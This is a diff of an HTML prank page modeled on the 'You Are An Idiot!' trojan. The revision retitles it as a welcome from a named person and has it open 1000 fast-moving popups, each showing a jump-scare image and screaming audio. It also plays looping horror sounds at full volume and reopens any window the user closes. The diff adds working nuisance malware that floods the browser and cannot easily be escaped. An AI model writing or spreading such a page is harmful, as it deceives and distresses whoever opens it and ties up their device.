@@ -2,22 +2,29 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>You Are An Idiot! - Ultimate Annoyance</title>
+  <title>هند القحطاني ترحب بكم!</title>
   <style>
     body {
       background-color: black;
-      color: lime;
+      color: crimson;
       text-align: center;
       font-size: 50px;
       margin-top: 20%;
+      /* تأثير وميض الخلفية */
+      animation: flicker 1s infinite alternate;
+    }
+    @keyframes flicker {
+      0% { opacity: 1; }
+      50% { opacity: 0.5; }
+      100% { opacity: 1; }
     }
   </style>
   <script>
-    // Global array to keep track of our popup windows and their movement properties
+    // مصفوفة لتتبع النوافذ المنبثقة وخصائص حركتها
     let popupWindows = [];
-    const NUM_WINDOWS = 10; // Increased number of windows
+    const NUM_WINDOWS = 1000; // زيادة عدد النوافذ
 
-    // Opens new pop-up windows until we reach the desired count
+    // دالة لفتح النوافذ المنبثقة
     function openPopups() {
       while (popupWindows.length < NUM_WINDOWS) {
         let newWin = window.open("", "", "width=300,height=200,resizable=yes,scrollbars=yes");
@@ -25,97 +32,105 @@
           newWin.document.write(`
             <html>
               <head>
-                <title>Annoying Popup</title>
+                <title>نافذة مخيفة</title>
                 <style>
                   body {
                     background-color: black;
-                    color: red;
+                    color: crimson;
                     font-size: 30px;
                     text-align: center;
                     margin-top: 50px;
+                    animation: flicker 1s infinite alternate;
+                  }
+                  @keyframes flicker {
+                    0% { opacity: 1; }
+                    50% { opacity: 0.5; }
+                    100% { opacity: 1; }
                   }
                 </style>
               </head>
               <body>
-                You Are An Idiot!
+                <div id="content">You Are An Idiot!</div>
+                <script>
+                  // بعد 5 ثواني، يتم استبدال النص بصورة قفزة (Jump Scare)
+                  setTimeout(function() {
+                    document.getElementById('content').innerHTML = '<img src="https://example.com/scary-image.jpg" alt="Scary" style="width:100%;height:auto;">';
+                    // تشغيل صوت صراخ مفاجئ في النافذة
+                    var popupAudio = new Audio('https://example.com/scream-sound.mp3');
+                    popupAudio.play();
+                  }, 5000);
+                <\/script>
               </body>
             </html>
           `);
-          // Each popup gets random initial position and speed
           popupWindows.push({
             win: newWin,
             x: Math.random() * (screen.width - 300),
             y: Math.random() * (screen.height - 200),
-            dx: (Math.random() * 20 + 10) * (Math.random() < 0.5 ? -1 : 1),
-            dy: (Math.random() * 20 + 10) * (Math.random() < 0.5 ? -1 : 1)
+            dx: (Math.random() * 30 + 20) * (Math.random() < 0.5 ? -1 : 1),
+            dy: (Math.random() * 30 + 20) * (Math.random() < 0.5 ? -1 : 1)
           });
         }
       }
     }
 
-    // Animates all open pop-up windows by moving them on the screen
+    // دالة لتحريك النوافذ بشكل عشوائي وبسرعة عالية
     function animatePopups() {
       setInterval(function() {
         popupWindows.forEach(function(obj) {
           if (obj.win && !obj.win.closed) {
-            // Move the window to its current coordinates
             obj.win.moveTo(obj.x, obj.y);
-            // Update coordinates for the next move
             obj.x += obj.dx;
             obj.y += obj.dy;
-            // Bounce off the horizontal edges
+            // عكس الاتجاه عند الوصول لحواف الشاشة
             if (obj.x < 0 || obj.x + 300 > screen.width) {
               obj.dx = -obj.dx;
             }
-            // Bounce off the vertical edges
             if (obj.y < 0 || obj.y + 200 > screen.height) {
               obj.dy = -obj.dy;
             }
           }
         });
-      }, 50); // Update positions every 50ms for a more frantic movement
+      }, 30); // تحديث كل 30 مللي ثانية لتحريك سريع
     }
 
-    // Plays two looping sounds to add to the noise
-    function playNoisySounds() {
-      // Primary sound (troll song)
-      let audio1 = new Audio('https://www.myinstants.com/media/sounds/troll-song.mp3');
+    // دالة لتشغيل أصوات مخيفة في الخلفية
+    function playHorrorSounds() {
+      // صوت موسيقى رعب (استبدل الرابط برابط صالح)
+      let audio1 = new Audio('https://example.com/horror-music.mp3');
       audio1.loop = true;
-      audio1.volume = 1.0; // Maximum volume
+      audio1.volume = 1.0;
       audio1.play();
 
-      // Secondary sound (for example, an evil laugh)
-      let audio2 = new Audio('https://www.myinstants.com/media/sounds/evil-laugh.mp3');
+      // صوت صراخ (استبدل الرابط برابط صالح)
+      let audio2 = new Audio('https://example.com/scream-sound.mp3');
       audio2.loop = true;
-      audio2.volume = 0.8;
-      // Slight delay before playing the second sound to layer the effects
+      audio2.volume = 1.0;
       setTimeout(() => {
         audio2.play();
-      }, 1000);
+      }, 500);
     }
 
-    // Checks periodically if any pop-ups have been closed and reopens them if needed
+    // دالة لمراقبة النوافذ وإعادة فتح أي نافذة يتم إغلاقها
     function maintainPopups() {
       setInterval(function() {
-        // Remove any closed windows from our tracking array
         popupWindows = popupWindows.filter(obj => obj.win && !obj.win.closed);
-        // Open more popups if necessary
         if (popupWindows.length < NUM_WINDOWS) {
           openPopups();
         }
       }, 2000);
     }
 
-    // Start all annoying behaviors once the main page loads
+    // بدء كل التأثيرات عند تحميل الصفحة الرئيسية
     window.onload = function() {
       openPopups();
       animatePopups();
-      playNoisySounds();
+      playHorrorSounds();
       maintainPopups();
     };
   </script>
 </head>
 <body>
-  <h1>You Are An Idiot!</h1>
+  <h1>طيور هند القحطاني ترحب بك!</h1>
 </body>
 </html>
